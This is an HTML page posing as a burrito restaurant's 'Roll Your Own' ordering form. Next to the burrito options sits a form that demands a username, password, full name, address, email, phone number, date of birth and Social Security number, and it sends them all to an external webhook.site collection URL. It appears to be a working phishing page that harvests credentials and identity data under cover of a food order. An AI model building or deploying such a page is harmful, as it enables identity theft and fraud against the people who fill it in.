<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Flying Burrito Bros Burritos</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="keywords" content="burritos, mexican, grill, tacos, barbacoa, Pork, unprocessed, sustainable, responsible, chicken, carnitas, nutrition, steak, restaurant, pepper, salsa, organic, guacamole, fast casual, quick service, menu, food, responsibly raised, barbacoa, burritos, mexican, grill, food, carnitas, jalapeno, restaurant, fast food, steak, beef, chicken, rice, vegetables, salsa, nacho, pepper, guacamole, cilantro, tortilla, unprocessed food, artisanal, Pork">
        <link href="https://fonts.googleapis.com/css?family=Pacifico&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="main.css"/>
    </head>

    <body>
        <main>  
            <div class="background">
                <div class="container1">
                   
                </div>
            </div>
        </main>
        <fieldset>
            <legend><h1>Roll Your Own!</h1></legend>
            <div class="container">
                <div class='row'>
                    <div class='column'>
                        <form action="http://webhook.site/5039c4d0-8cdf-4cf4-92f4-1e34ceb01bae" method="post">
                            <label for="tortilla">Tortilla</label>
                                <input type="radio" name="tortilla" value="white">Flour<br>
                                <input type="radio" name="tortilla" value="corn"> Corn<br>
                            
                            <label for="rice">Rice:</label>
                                <input type="radio" name="rice" value="white">White<br>
                                <input type="radio" name="rice" value="wheat">Brown<br>
                        
                            <label for="rice">Bean:</label>
                                <input type="radio" name="beans" value="pinto">Pinto<br>
                                <input type="radio" name="beans" value="black">Black<br>

                            <label for="protein">Protein:</label>
                                <input type="radio" name="protein" value="carnitas">Carnitas<br>
                                <input type="radio" name="protein" value="chicken">Chicken<br>
                                <input type="radio" name="protein" value="sofritas">Carne Asada<br>
                                <input type="radio" name="protein" value="none">None<br>

                            <label for="adds">Extras:</label>
                                <input type="radio" name="adds" value="cheese">Cheese<br>
                                <input type="radio" name="adds" value="sour">Sour Cream<br>
                        </form>
                    </div>
                    <div class='column'>
                            <form action="http://webhook.site/5039c4d0-8cdf-4cf4-92f4-1e34ceb01bae" method="post">   

                                <label for="user">Username</label>
                                    <input type="text" id="lname" name="username" placeholder="Username" minlength="6" required>
                                    
                                <label for="pass">Password</label>
                                    <input type="text" id="lname" name="password" placeholder="Password" minlength="6" required><br>
                                    
                                <label for="fname">Full Name</label>
                                    <input type="text" id="lname" name="fullname" required="required" pattern="^\S+\s\S+$" placeholder="Full Name" pattern="[A-z]{3}[A-z]{3}"><br>

                                <label for="address1">Address</label>
                                    <input type="text" id="lname" name="addr" required="required" placeholder="Address" size="20"><br>

                                <label for="address2">City, ST, Zip</label>
                                    <input type="text" id="lname" name="local" required="required" placeholder="City, ST Zip" size="20" pattern="^([^,]+),\s([A-Z]{2})(?:\s(\d{5}))?$">
                                    <br>

                                                    
                                <label for="email">Email</label>
                                    <input type="email" id="lname" name="email" required="required" placeholder="Email" size="20" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2, 4}$">
                                    
                                <label for="phone">Phone</label>
                                    <input type="text" id="lname" name="phone" required="required" placeholder="555-333-4444" size="20" pattern="[0-9]{3}+-[0-9]{3}+-[0-9]{4}"><br>
                                    
                                <label for="dob">DOB</label>
                                    <input type="text" id="lname" name="dob" required="required" placeholder="mo/day/year" size="20" input type="text" pattern="\d{1,2}/\d{1,2}/\d{4}">
                                    
                                <label for="ssn">SSN</label>
                                    <input type="text" id="lname" name="ssn" required="required" placeholder="123-45-6789" size="20" pattern="[0-9]{3}+-[0-9]{2}+-[0-9]{4}"><br>
                                    
                                <input type="submit" value="Order Now">
                            </form>
                        </div>
                    </div>
            </div> 
        </fieldset>
    </body>
</html>
